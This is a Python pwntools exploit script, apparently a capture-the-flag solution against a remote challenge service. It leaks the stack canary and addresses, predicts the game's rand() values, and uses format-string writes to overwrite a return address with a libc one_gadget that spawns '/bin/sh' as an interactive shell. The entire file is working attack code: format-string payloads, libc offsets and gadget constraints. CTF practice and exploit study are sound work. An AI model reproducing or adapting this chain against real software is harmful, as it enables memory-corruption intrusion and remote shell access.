from pwn import *
from ctypes import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./service")
io=remote("node3.anna.nssctf.cn",28642)
elf=ELF("./service")
cs=cdll.LoadLibrary("./libc-2.31.so")
libc=ELF("./libc-2.31.so")

# gdb.attach(io)
# pause()

io.sendafter(b"name:\n",b"a"*0x109)
io.recvuntil(b"a"*0x109)
canary=u64(io.recv(7).rjust(8,b"\x00"))
stack_addr=u64(io.recv(6).ljust(8,b"\x00"))
print("canary: "+hex(canary))
print("stack_addr: "+hex(stack_addr))

cs.srand(0x61616161)

def game():
    io.recvuntil(b": \n")
    num=cs.rand()%3
    if num==1:
        io.sendline(b"2")
    if num==2:
        io.sendline(b"0")
    if num==0:
        io.sendline(b"1")

for i in range(100):
    game()

ret_addr=stack_addr-0x218

payload="%{}c%{}$hhn.%9$p.".format(0x3e,8).encode()+p64(ret_addr)
#向偏移为8处存储ret_addr并覆盖ret_addr地址处数据低字节`\x43`为`\x3e`从而返回vuln
#同时泄露libc地址

io.sendafter(b"you.\n",payload)

io.recvuntil(b".")
leak_addr=int(io.recv(14),16)-175-libc.sym[b"printf"]
print("leak_addr: ",hex(leak_addr))
shell=leak_addr+0xe3b31

payload=fmtstr_payload(6,{ret_addr:shell})
io.send(payload)
#修改ret_addr为one_gadget

io.interactive()

# 0xe3b2e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b31 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b34 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
